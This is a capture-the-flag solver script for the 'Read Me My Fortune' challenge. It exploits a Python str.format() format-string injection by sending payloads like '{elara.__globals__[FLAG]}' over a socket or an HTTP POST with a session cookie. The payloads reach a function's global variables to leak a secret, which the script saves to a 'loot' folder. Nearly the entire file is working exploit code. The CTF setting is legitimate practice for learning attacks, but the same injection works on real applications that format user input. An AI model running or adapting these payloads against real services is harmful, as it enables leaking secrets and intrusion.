#!/usr/bin/env python3 -I
"""
Read Me My Fortune (POCTF 2026, ID=127) solver.
Python format string vulnerability via str.format() with exposed function object.

The service exposes a function object 'elara' to the formatter.
Payload: {elara.__globals__[FLAG]}

Usage: python3 -I solve_format_string.py <host> <port> [session_cookie]
"""
import socket
import sys
import time
import pathlib


def connect_and_exploit(host, port, session_cookie=None):
    print(f"[*] Connecting to {host}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    try:
        sock.connect((host, int(port)))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

    banner = recv_all(sock)
    print(f"[*] Banner: {banner[:200]}")

    if session_cookie:
        sock.sendall(f"{session_cookie}\n".encode())
        resp = recv_all(sock)
        print(f"[*] Auth response: {resp[:200]}")

    payloads = [
        "{elara.__globals__[FLAG]}",
        "{elara.__globals__[flag]}",
        "{elara.__globals__[Flag]}",
    ]

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        sock.sendall(f"{payload}\n".encode())
        resp = recv_all(sock)
        print(f"[*] Response: {resp[:500]}")

        if "POCTF{" in resp:
            start = resp.index("POCTF{")
            end = resp.index("}", start) + 1
            flag = resp[start:end]
            print(f"\n[+] FLAG FOUND: {flag}")
            sock.close()
            return flag

    sock.close()
    return None


def recv_all(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data.decode('utf-8', errors='replace')


def exploit_via_web(base_url, session_cookie):
    """Alternative: exploit via HTTP if the service has a web interface."""
    import urllib.request
    import urllib.parse
    import json

    payloads = [
        "{elara.__globals__[FLAG]}",
        "{elara.__globals__[flag]}",
    ]

    for payload in payloads:
        print(f"\n[*] Trying web payload: {payload}")
        url = f"{base_url}"
        data = urllib.parse.urlencode({"template": payload, "fortune": payload}).encode()

        req = urllib.request.Request(url, data=data)
        if session_cookie:
            req.add_header("Cookie", f"session={session_cookie}")

        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='replace')
            if "POCTF{" in body:
                start = body.index("POCTF{")
                end = body.index("}", start) + 1
                flag = body[start:end]
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
            print(f"[*] Response (first 500): {body[:500]}")
        except Exception as e:
            print(f"[!] Error: {e}")

    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 -I solve_format_string.py <host> <port> [session_cookie]")
        print("   or: python3 -I solve_format_string.py --web <url> [session_cookie]")
        sys.exit(1)

    if sys.argv[1] == "--web":
        url = sys.argv[2]
        cookie = sys.argv[3] if len(sys.argv) > 3 else None
        flag = exploit_via_web(url, cookie)
    else:
        host = sys.argv[1]
        port = sys.argv[2]
        cookie = sys.argv[3] if len(sys.argv) > 3 else None
        flag = connect_and_exploit(host, port, cookie)

    if flag:
        outdir = pathlib.Path(__file__).parent.parent / "loot"
        outdir.mkdir(exist_ok=True)
        (outdir / "flag.txt").write_text(flag + "\n")
        print(f"[+] Saved to loot/flag.txt")
    else:
        print("\n[!] No flag found. May need valid session cookie or different payload variant.")
